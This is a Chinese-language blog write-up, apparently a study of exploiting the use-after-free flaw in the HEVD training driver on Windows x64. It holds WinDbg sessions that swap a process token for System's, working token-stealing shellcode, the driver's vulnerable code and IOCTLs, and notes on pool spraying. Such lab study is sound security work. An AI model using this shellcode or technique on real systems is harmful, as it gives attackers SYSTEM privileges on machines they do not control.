<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !token ffffe78d`fac0c050</span><br></pre></td></tr></table></figure>

<p>定位cmd.exe进程的<code>_EPROCESS</code>结构并替换偏移0x208的token指针值为System的token地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !process 0 0 cmd.exe</span><br><span class="line">PROCESS ffff940fd7240080</span><br><span class="line">    SessionId: 1  Cid: 2270    Peb: f4e7043000  ParentCid: 13bc</span><br><span class="line">    DirBase: 172720000  ObjectTable: ffffe78e02a18080  HandleCount:  75.</span><br><span class="line">    Image: cmd.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _EX_FAST_REF +0x4b8+ffff940fd7240080</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78e`02dcb06b Void</span><br><span class="line">   +0x000 RefCnt           : 0y1011</span><br><span class="line">   +0x000 Value            : 0xffffe78e`02dcb06b</span><br><span class="line"></span><br><span class="line">0: kd&gt; eq 0x4b8+ffff940fd7240080 0xffffe78d`fac0c050</span><br><span class="line">0: kd&gt; dt _EX_FAST_REF +0x4b8+ffff940fd7240080</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78d`fac0c05e Void</span><br><span class="line">   +0x000 RefCnt           : 0y1110</span><br><span class="line">   +0x000 Value            : 0xffffe78d`fac0c05e</span><br><span class="line">0: kd&gt; g</span><br></pre></td></tr></table></figure>

<p>替换成功</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">desktop</span>-8<span class="title">h64pu1</span>\<span class="title">debugger</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br></pre></td></tr></table></figure>

<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>寻找 <code>_KTHREAD</code> 结构：反汇编 <code>PsGetCurrentThread</code> 函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; uf PsGetCurrentProcess </span><br><span class="line">nt!PsGetCurrentProcess:</span><br><span class="line">fffff801`3f68eea0 65488b042588010000 mov   rax,qword ptr gs:[188h]</span><br><span class="line">fffff801`3f68eea9 488b80b8000000  mov     rax,qword ptr [rax+0B8h]</span><br><span class="line">fffff801`3f68eeb0 c3              ret</span><br></pre></td></tr></table></figure>

<p>其实<code>gs:[188h]</code>的位置存贮的是 <code>_KTHREAD</code> 结构的地址，看一下这个结构，发现0x220的位置存储的就是 <code>_KPROCESS</code>，但是这里是取得 <code>0xb8</code>, 0x98其实存储的结构是<code>_KAPC_STATE</code>，<code>0x20</code>位置存储的就是<code>_KPROCESS</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _KTHREAD</span><br><span class="line">   ...</span><br><span class="line">   +0x098 ApcStateFill     : [43] UChar</span><br><span class="line">   +0x0c3 Priority         : Char</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _KAPC_STATE</span><br><span class="line">ntdll!_KAPC_STATE</span><br><span class="line">   +0x000 ApcListHead      : [2] _LIST_ENTRY</span><br><span class="line">   +0x020 Process          : Ptr64 _KPROCESS</span><br><span class="line">   +0x028 InProgressFlags  : UChar</span><br><span class="line">   +0x028 KernelApcInProgress : Pos 0, 1 Bit</span><br><span class="line">   +0x028 SpecialApcInProgress : Pos 1, 1 Bit</span><br><span class="line">   +0x029 KernelApcPending : UChar</span><br><span class="line">   +0x02a UserApcPendingAll : UChar</span><br><span class="line">   +0x02a SpecialUserApcPending : Pos 0, 1 Bit</span><br><span class="line">   +0x02a UserApcPending   : Pos 1, 1 Bit</span><br></pre></td></tr></table></figure>

<p>因此在r3寻找到 <code>_KPROCESS </code>的实现</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mov r9, qword ptr gs:[<span class="number">0x188</span>]  </span><br><span class="line">mov r9, qword ptr[r9+<span class="number">0x0B8</span>]</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">mov r9, qword ptr gs:[<span class="number">0x188</span>]  </span><br><span class="line">mov r9, qword ptr[r9+<span class="number">0x220</span>]</span><br></pre></td></tr></table></figure>

<p><code>_EPROCESS</code>是包含了<code>_KPROCESS</code>的结构体，他们的起始地址是一样的，我们可以通过dt来查看</p>
<ul>
<li>内核用来跟踪进程的结构是KPROCESS。 执行子系统用来跟踪它的结构是EPROCESS。 作为一个实现细节，KPROCESS是EPROCESS的第一个字段，所以执行子系统分配EPROCESS结构，然后调用coreel来初始化它的KPROCESS部分。最后，这两个结构都是表示用户进程实例的Process Object的一部分。</li>
<li>在<a href="https://stackoverflow.com/questions/5790587/what-is-the-difference-between-eprocess-object-and-kprocess-object">Stack Overflow</a>寻找答案</li>
</ul>
<p>第一个元素就是 <code>_KPROCESS</code>, <code>UniqueProcessId</code> 存储的是当前进程的pid，<code>InheritedFromUniqueProcessId</code>存储的是父进程的pid</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _EPROCESS</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x438 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x440 UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +0x448 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   ...</span><br><span class="line">   +0x540 InheritedFromUniqueProcessId : Ptr64 Void</span><br><span class="line">   +0x548 OwnerProcessId   : Uint8B</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>因为程序大多数在cmd.exe启动，因此我们获得的是 cmd 的 <code>_KPROCESS</code>，我们需要替换的是这个，我们需要寻找到system进程token</p>
<p>链表元素就是 <code>ActiveProcessLinks</code>，接下来遍历这个链表就可以找到system(pid&#x3D;4)的<code>_KPROCESS</code>。参考<a href="https://bbs.kanxue.com/thread-224058-1.htm">这里</a>，修改偏移为当前系统的</p>
<ul>
<li>EPROCESS 在 KTHREAD + 0xb8</li>
<li>ActiveProcessLinks 在 EPROCESS + 0x448</li>
<li>ActiveProcessLinks 距离 Token 距离</li>
<li>token 在 EPROCESS + 0x4b8 处</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">    mov rdx, [gs:<span class="number">188</span>h]       ;get _ETHREAD pointer from KPCR</span><br><span class="line">    mov r8, [rdx+<span class="number">0xb8</span>]       ;_EPROCESS (see PsGetCurrentProcess function)</span><br><span class="line">    mov r9, [r8+<span class="number">0x448</span>]       ;ActiveProcessLinks list head</span><br><span class="line">    mov rcx, [r9]            ;follow link to first process in list</span><br><span class="line">find_system_proc:</span><br><span class="line">    mov rdx, [rcx<span class="number">-8</span>]         ;offset from ActiveProcessLinks to UniqueProcessId</span><br><span class="line">    cmp rdx, <span class="number">4</span>               ;process with ID <span class="number">4</span> is System process</span><br><span class="line">    jz found_it</span><br><span class="line">    mov rcx, [rcx]           ;follow _LIST_ENTRY Flink pointer</span><br><span class="line">    cmp rcx, r9              ;see <span class="keyword">if</span> back at list head</span><br><span class="line">    jnz find_system_proc</span><br><span class="line">found_it:</span><br><span class="line">    mov rax, [rcx+<span class="number">0x80</span>]      ;offset from ActiveProcessLinks to Token</span><br><span class="line">    <span class="keyword">and</span> al, <span class="number">0xf0</span>             ;clear low <span class="number">4</span> bits of _EX_FAST_REF structure</span><br><span class="line">    mov [r8+<span class="number">0x4b8</span>], rax      ;replace current process token with system token</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

<h2 id="寻找合适的对象"><a href="#寻找合适的对象" class="headerlink" title="寻找合适的对象"></a>寻找合适的对象</h2><p>池喷射需要找到适合大小的内核对象以及池对象，使用windbg分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!object \ObjectTypes</span><br><span class="line"></span><br><span class="line">dt nt!_OBJECT_TYPE &lt;addr&gt;</span><br><span class="line">dt nt!_OBJECT_TYPE_INITIALIZER &lt;addr&gt;</span><br></pre></td></tr></table></figure>

<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>在存在漏洞的驱动里，对象free后没有置为NULL</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">FreeUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Freeing UaF Object\n&quot;</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(POOL_TAG));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SECURE</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Secure Note: This is secure because the developer is setting</span></span><br><span class="line">            <span class="comment">// &#x27;g_UseAfterFreeObjectNonPagedPool&#x27; to NULL once the Pool chunk is being freed</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">ExFreePoolWithTag</span>((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Set to NULL to avoid dangling pointer</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            g_UseAfterFreeObjectNonPagedPool = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Vulnerability Note: This is a vanilla Use After Free vulnerability</span></span><br><span class="line">            <span class="comment">// because the developer is not setting &#x27;g_UseAfterFreeObjectNonPagedPool&#x27; to NULL.</span></span><br><span class="line">            <span class="comment">// Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer</span></span><br><span class="line">            <span class="comment">// (dangling pointer)</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">ExFreePoolWithTag</span>((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">            Status = STATUS_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就可以UAF调用callback函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">UseUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Using UaF Object\n&quot;</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool-&gt;Callback: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool-&gt;Callback);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Calling Callback\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool-&gt;Callback)</span><br><span class="line">            &#123;</span><br><span class="line">                g_UseAfterFreeObjectNonPagedPool-&gt;<span class="built_in">Callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Status = STATUS_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>两个版本，一个是 <code>Nx</code> 版本，也就是不能写shellcode。</p>
<p>g_UseAfterFreeObjectNonPagedPool 初始化</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">AllocateUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Allocating UaF Object\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Allocate Pool chunk</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL)<span class="built_in">ExAllocatePoolWithTag</span>(</span><br><span class="line">            NonPagedPool,</span><br><span class="line">            <span class="built_in">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL),</span><br><span class="line">            (ULONG)POOL_TAG</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!UseAfterFree)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Unable to allocate Pool chunk</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Status = STATUS_NO_MEMORY;</span><br><span class="line">            <span class="keyword">return</span> Status;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(POOL_TAG));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(NonPagedPool));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Size: 0x%zX\n&quot;</span>, <span class="built_in">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, UseAfterFree);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Fill the buffer with ASCII &#x27;A&#x27;</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">RtlFillMemory</span>((PVOID)UseAfterFree-&gt;Buffer, <span class="built_in">sizeof</span>(UseAfterFree-&gt;Buffer), <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Null terminate the char buffer</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree-&gt;Buffer[<span class="built_in">sizeof</span>(UseAfterFree-&gt;Buffer) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Set the object Callback function</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree-&gt;Callback = &amp;UaFObjectCallbackNonPagedPool;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Assign the address of UseAfterFree to a global variable</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        g_UseAfterFreeObjectNonPagedPool = UseAfterFree;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] UseAfterFree Object: 0x%p\n&quot;</span>, UseAfterFree);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] UseAfterFree-&gt;Callback: 0x%p\n&quot;</span>, UseAfterFree-&gt;Callback);</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>UAF结构体</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_USE_AFTER_FREE_NON_PAGED_POOL</span></span><br><span class="line">&#123;</span><br><span class="line">    FunctionPointer Callback;</span><br><span class="line">    CHAR Buffer[<span class="number">0x54</span>];</span><br><span class="line">&#125; USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL;</span><br></pre></td></tr></table></figure>

<p>寻找IOCTL：IDA 打开，交叉引用</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222013</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">AllocateUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x222017</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">UseUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x22201B</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">FreeUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>思路：UAF劫持callback函数，让其执行提权的代码。</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>加载驱动，查看是否加载成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; lm m H*</span><br></pre></td></tr></table></figure>

<p>打断点和显示DbgPrint信息</p>
<ul>
<li><code>DebugBreak()</code> 应用程序触发kenel debug断点</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; ed nt!Kd_DEFAULT_MASK 0xFFFFFFFF</span><br></pre></td></tr></table></figure>

<p>因为存在 <code>Tag</code> 可以寻找pool，比较花时间，可以在DebugView里寻找信息.<code>!poolfind</code> 命令不会计算头部，<code>!pool</code> 会计算</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !poolused 2 Hack</span><br><span class="line">0: kd&gt; !poolfind Hack -nonpaged</span><br><span class="line">3: kd&gt; g</span><br><span class="line">***** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><br><span class="line">[+] Allocating UaF Object</span><br><span class="line">[+] Pool Tag: &#x27;kcaH&#x27;</span><br><span class="line">[+] Pool Type: NonPagedPool</span><br><span class="line">[+] Pool Size: 0x60</span><br><span class="line">[+] Pool Chunk: 0xFFFFA78BEF702B50</span><br><span class="line">[+] UseAfterFree Object: 0xFFFFA78BEF702B50</span><br><span class="line">[+] g_UseAfterFreeObjectNonPagedPool: 0xFFFFA78BEF702B50</span><br><span class="line">[+] UseAfterFree-&gt;Callback: 0xFFFFF8012D287CD0</span><br><span class="line">****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">0033:00007ff9`b21bb6d2 cc              int     3</span><br><span class="line">1: kd&gt; !pool 0xFFFFA78BEF702B50</span><br><span class="line">Pool page ffffa78bef702b50 region is Nonpaged pool</span><br><span class="line"> ffffa78bef702000 size:   30 previous size:    0  (Free)       ....</span><br><span class="line"> ffffa78bef702040 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7020e0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702180 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702220 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7022c0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702360 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702400 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7024a0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702540 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7025e0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702680 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702720 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7027c0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702860 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702900 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7029a0 size:   90 previous size:    0  (Allocated)  FSim</span><br></pre></td></tr></table></figure>

<p>查看内存信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1: kd&gt; dq 0xFFFFA78BEF702B50</span><br><span class="line">ffffa78b`ef702b50  fffff801`2d287cd0 41414141`41414141</span><br><span class="line">ffffa78b`ef702b60  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b70  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b80  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b90  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702ba0  41414141`41414141 00000000`00414141</span><br><span class="line">ffffa78b`ef702bb0  fe8fc5c0`d7167489 00000000`00000000</span><br><span class="line">ffffa78b`ef702bc0  00000000`00000000 ffffa78b`ef714039</span><br></pre></td></tr></table></figure>


<p>pool 实际大小，需要加入一个头部信息，可以从下面看出来，是一个 <code>_LIST_ENTRY</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> ffffa78bef702900 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7029a0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"></span><br><span class="line">1: kd&gt; !poolused 2 Hack</span><br><span class="line">Using a machine size of 1ffe7e pages to configure the kd cache</span><br><span class="line">....</span><br><span class="line"> Sorting by NonPaged Pool Consumed</span><br><span class="line">               NonPaged                  Paged</span><br><span class="line"> Tag     Allocs         Used     Allocs         Used</span><br><span class="line"> Hack         1          112          0            0	UNKNOWN pooltag &#x27;Hack&#x27;, please update pooltag.txt</span><br><span class="line">TOTAL         1          112          0            0</span><br></pre></td></tr></table></figure>

<p>因此实际获得的大小：0x70，内存对齐</p>
<p>内核池喷射是一项使池中分配位置可预测的艺术。这意味着你可以知道一个块将被分配到哪里，哪些块在其附近。</p>
<ul>
<li>微软有一个<a href="https://learn.microsoft.com/zh-cn/windows/win32/sysinfo/kernel-objects">内核对象 - Win32 apps</a>列表，我们可以通过调用用户模式功能来创建内核对象，</li>
</ul>
<p>触发UAF前，需要使用 heap fengshui</p>
<ul>
<li>可以不布局，看来几篇文章，直接利用 <a href="https://blog.csdn.net/qq_36918532/article/details/123417458">(3)</a></li>
<li><code>NtAllocateReserveObject</code> 布局，但是在x64下得到错误的</li>
<li>x64下可以使用<code>CreatePipe</code>和<code>WriteFile</code>来进行NonPagedPool喷射，缓冲区大小：PoolSize-HeaderSize(0x48)，NpFr tag。<a href="https://securityinsecurity.github.io/exploiting-hevd-use-after-free/">(4)</a>[(5)](<a href="https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/">Windows Kernel Exploitation – HEVD x64 Use-After-Free • Vulndev</a>)</li>
</ul>
<p>free后被合并，因此提高成功率，就创建碎片</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*ffffa78bef702a30 size:  5b0 previous size:    0  (Free)      *...~</span><br></pre></td></tr></table></figure>

<p>参考<a href="https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/">(6)</a>，获得两个句柄 <code>0xac, 0xb0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !poolused 2 NpFr</span><br><span class="line">Using a machine size of 1ffe7e pages to configure the kd cache</span><br><span class="line">...</span><br><span class="line"> Sorting by NonPaged Pool Consumed</span><br><span class="line">               NonPaged                  Paged</span><br><span class="line"> Tag     Allocs         Used     Allocs         Used</span><br><span class="line"></span><br><span class="line"> NpFr         1          112          0            0	DATA_ENTRY records (read/write buffers) , Binary: npfs.sys</span><br><span class="line"></span><br><span class="line">TOTAL         1          112          0            0</span><br></pre></td></tr></table></figure>

<p>写入UAF，存在一个FAKE_OBJECT，可以进行写入</p>
